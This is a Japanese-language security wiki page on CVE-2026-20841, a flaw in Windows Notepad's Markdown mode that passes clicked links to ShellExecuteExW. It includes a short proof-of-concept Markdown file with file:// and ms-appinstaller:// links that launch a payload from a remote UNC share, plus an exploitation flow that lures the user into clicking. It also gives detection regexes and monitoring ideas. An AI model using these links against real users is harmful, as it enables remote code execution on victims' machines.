# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Markdown または HTML をレンダリングする Windows アプリケーションは、クリックされた target を `ShellExecuteExW` に渡す場合があります。ShellExecute は登録済みの URI scheme と file association をディスパッチするため、レンダラーはすべての link が HTTP(S) であると想定せず、明示的な allowlist を使用する必要があります。以下の Notepad の動作は CVE-2026-20841 について説明したものであり、すべてのレンダラーに一般化すべきではありません。<sup>[[1]](#references)[[3]](#references)</sup>

## Windows Notepad Markdown mode における ShellExecuteExW surface
- Notepad は `sub_1400ED5D0()` 内の固定文字列比較により、`.md` extensions の場合にのみ Markdown mode を選択します。<sup>[[1]](#references)</sup>
- Supported Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>`（`[target](target)` としてレンダリングされる）のため、payload と detection では両方の syntax が重要です。
- Link の click は `sub_140170F60()` で処理されます。この関数は弱い filtering を行った後、`ShellExecuteExW` を呼び出します。
- `ShellExecuteExW` は HTTP(S) に限らず、**任意の configured protocol handler** にディスパッチします。<sup>[[1]](#references)</sup>

### Payload に関する考慮事項
- Link 内の `\\` sequences は `ShellExecuteExW` の前に **`\\` から `\` に normalize** されるため、UNC/path の crafting と detection に影響します。
- `.md` files は **default では Notepad に associated されていません**。そのため victim はファイルを Notepad で開き、link を click する必要があります。ただし、いったんレンダリングされると link は click 可能です。
- Dangerous example schemes:<sup>[[1]](#references)</sup>
- `file://`：local/UNC payload を launch する。
- `ms-appinstaller://`：App Installer flows を trigger する。その他の locally registered schemes も abuse できる可能性があります。

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. Notepad が Markdown としてレンダリングするよう **`.md` file** を作成する。
2. 危険な URI scheme（`file:`、`ms-appinstaller:`、またはインストール済みの任意の handler）を使用して link を埋め込む。
3. ファイルを（HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB または同様の手段で）配布し、ユーザーを誘導して Notepad で開かせる。
4. クリックすると、**normalized link** が `ShellExecuteExW` に渡され、対応する protocol handler がユーザーの context で参照先の content を実行する。<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- ドキュメントの配布によく使用される port/protocol 経由での `.md` file の転送を監視する: `20/21 (FTP)`、`80 (HTTP)`、`443 (HTTPS)`、`110 (POP3)`、`143 (IMAP)`、`25/587 (SMTP)`、`139/445 (SMB/CIFS)`、`2049 (NFS)`、`111 (portmap)`。
- Markdown link（standard および autolink）を解析し、**case-insensitive** な `file:` または `ms-appinstaller:` を探す。
- remote resource access を検出するための Vendor-guided regex:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- ZDI が説明している vendor fix は、受け入れる対象をローカルファイルと HTTP(S) に制限します。登録されている attack surface はシステムごとに異なるため、必要に応じて他のインストール済み protocol handler も検出対象に追加してください。<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Windows Notepad における任意コード実行](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
